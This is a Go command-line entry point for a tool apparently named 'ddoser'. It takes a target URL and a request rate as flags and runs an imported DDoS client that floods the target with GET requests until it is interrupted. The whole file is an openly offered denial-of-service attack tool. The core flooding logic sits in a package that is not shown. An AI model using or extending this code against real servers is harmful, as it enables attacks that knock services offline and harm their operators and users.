package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"time"

	"github.com/goodleby/ddoser/client/ddos"
)

const DefaultClientTimeout = 1 * time.Second

func main() {
	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, os.Kill)
	defer cancel()

	url, rate, err := ReadFlags()
	if err != nil {
		log.Fatalf("Error reading flags: %v", err)
	}

	ddosClient, err := ddos.NewClient(DefaultClientTimeout)
	if err != nil {
		log.Fatalf("Error creating ddos client: %v", err)
	}

	req, err := http.NewRequestWithContext(
		ctx,
		http.MethodGet,
		url,
		nil,
	)
	if err != nil {
		log.Fatalf("Error creating request: %v", err)
	}

	go func() {
		err = ddosClient.DDoS(req, rate)
		if err != nil {
			log.Printf("Error ddosing: %v", err)
		}
	}()

	<-ctx.Done()

	log.Println("Stopped ddosing")
}

func ReadFlags() (string, int, error) {
	var url string
	var rate int

	flag.StringVar(&url, "url", "", "Target URL to ddos")
	flag.IntVar(&rate, "rate", 10, "Amount of requests per second")

	flag.Parse()

	if url == "" || rate == 0 {
		return "", 0, fmt.Errorf("missing some required flags")
	}

	return url, rate, nil
}
